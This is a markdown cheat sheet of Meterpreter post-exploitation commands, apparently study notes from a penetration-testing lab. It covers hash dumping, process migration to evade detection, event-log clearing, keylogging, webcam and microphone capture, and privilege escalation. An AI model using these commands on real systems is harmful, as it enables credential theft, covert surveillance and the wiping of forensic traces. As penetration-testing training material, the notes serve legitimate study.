# 🚀 Meterpreter Essentials

## 🎯 1. Basic Info Gathering

### System Information

```bash
sysinfo  # Shows system details (OS, architecture, domain, users)
```

### Get User ID

```bash
getuid  # Shows which user the Meterpreter session is running under
```

### List Processes

```bash
ps  # Lists running processes (to find PIDs for migration)
```

## 📂 2. Migrating to Another Process

Used to stabilize the session or evade detection.

```bash
migrate <pid>  # Example: migrate 768
```

## 🔍 3. Dumping Hashes

Extracts local password hashes (SAM database).

```bash
hashdump
```

## 📡 4. Finding SMB Shares

Run from MSF console:

```bash
use post/windows/gather/enum_shares
set session <id>
run
```

**Example Output**:

- `SYSVOL`, `NETLOGON`: Typical domain shares
- `speedster`: Possible custom share

## 💻 5. Upgrading Shells

Upgrade a simple cmd shell to Meterpreter:

```bash
sessions -u <session_id>
```

Or run the `shell_to_meterpreter` script.

## 🛠 6. Meterpreter Core Commands

```bash
help  # Lists available commands
```

|Command|Description|
|---|---|
|`background`|Sends session to background|
|`sessions`|Lists/switches sessions|
|`exit`|Ends the session|
|`load`|Loads extensions (e.g., `load kiwi`)|
|`run`|Executes Meterpreter scripts or modules|

## 📁 7. File System Commands

|Command|Description|
|---|---|
|`ls`|List files in current directory|
|`cd`|Change directory|
|`pwd`|Print current directory|
|`cat <file>`|View file contents|
|`download`|Download file/directory|
|`upload`|Upload file/directory|
|`search`|Search for files|
|`rm <file>`|Delete file|

## 🌐 8. Network Commands

|Command|Description|
|---|---|
|`ifconfig`|Show network interfaces|
|`netstat`|List network connections|
|`arp`|Show ARP table|
|`route`|View/modify routing table|
|`portfwd`|Set up local->remote port forward|

## ⚙️ 9. System Commands

|Command|Description|
|---|---|
|`execute`|Run a system command|
|`shell`|Drop to normal cmd shell|
|`getpid`|Get current PID|
|`kill <pid>`|Kill process|
|`clearev`|Clear event logs|
|`shutdown`|Power off system|
|`reboot`|Restart system|

## 🎥 10. Other Powerful Options

|Command|Description|
|---|---|
|`screenshot`|Capture screen|
|`keyscan_start`|Start keylogging|
|`keyscan_dump`|Dump keystrokes|
|`record_mic`|Record from microphone|
|`webcam_snap`|Take a webcam picture|
|`getsystem`|Try to elevate to SYSTEM privilege|

## ✅ Quick Notes

- Always run `help` to see available commands (they vary based on OS and Meterpreter payload).
- If a command fails, check privileges or try migrating to another process.
- Advanced modules (e.g., `hashdump`, `getsystem`, `kiwi`, `webcam`) may require **SYSTEM privileges**.